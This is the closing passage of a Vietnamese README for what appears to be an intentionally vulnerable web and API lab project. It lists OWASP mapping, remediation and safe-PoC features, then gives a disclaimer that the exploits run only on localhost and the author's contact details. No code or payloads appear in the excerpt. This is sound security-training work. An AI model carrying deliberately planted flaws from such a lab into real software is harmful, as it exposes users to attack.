| ✅ OWASP Mapping | Ánh xạ lỗ hổng với OWASP Top 10 và OWASP API Security Top 10 |
| ✅ Remediation | Đề xuất sửa lỗi cụ thể với code example |
| ✅ Responsible Disclosure | PoC an toàn, không exfiltrate dữ liệu, khôi phục sau kiểm thử |

---

## ⚠️ Tuyên bố miễn trừ trách nhiệm

> Dự án này được xây dựng **có chủ đích chứa lỗ hổng** để phục vụ mục đích **học tập và đánh giá bảo mật** trong môi trường phòng thí nghiệm cá nhân. Tất cả các bài khai thác (exploit) chỉ được thực hiện trên **localhost**. Không được sử dụng các kỹ thuật này trên hệ thống mà bạn không có quyền kiểm thử.

---

**Người thực hiện:** Hoàng Ngọc Lâm  
**Liên hệ:** [GitHub — HoangLam1337](https://github.com/HoangLam1337)  
**Ngày hoàn thành:** Tháng 4/2026
